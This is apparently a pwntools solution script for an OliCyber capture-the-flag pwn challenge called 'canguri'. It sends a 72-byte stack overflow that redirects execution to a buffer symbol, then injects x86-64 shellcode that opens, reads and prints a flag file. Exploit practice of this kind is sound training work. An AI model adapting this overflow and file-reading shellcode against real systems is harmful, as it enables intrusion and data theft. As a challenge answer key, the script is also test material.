#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canguri '--host=kangaroo.challs.olicyber.it' '--port=20005'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'canguri')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'kangaroo.challs.olicyber.it'
port = int(args.PORT or 20005)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

payload = b"A"*45 + b"/home/problemuser/flag.txt\x00"
payload = b"A"*72
payload += p64(exe.sym.bufferone) 

io.sendlineafter(b"?\n", payload)

shellcode = """
    push 0x0000000000007478
    mov rbx, 0x742e67616c662f72
    push rbx
    mov rbx, 0x6573756d656c626f
    push rbx
    mov rbx, 0x72702f656d6f682f
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x2
    syscall

    mov rdi, rax
    mov esi, 0x404200
    mov dl, 0x20
    xor eax, eax
    syscall

    mov dil, 0x1
    mov esi, 0x404200
    mov rdx, rax
    mov al, 0x1
    syscall
"""

# 0x4040c0

payload = asm(shellcode)
print(len(payload))
io.sendlineafter(b".\n", payload)

io.interactive()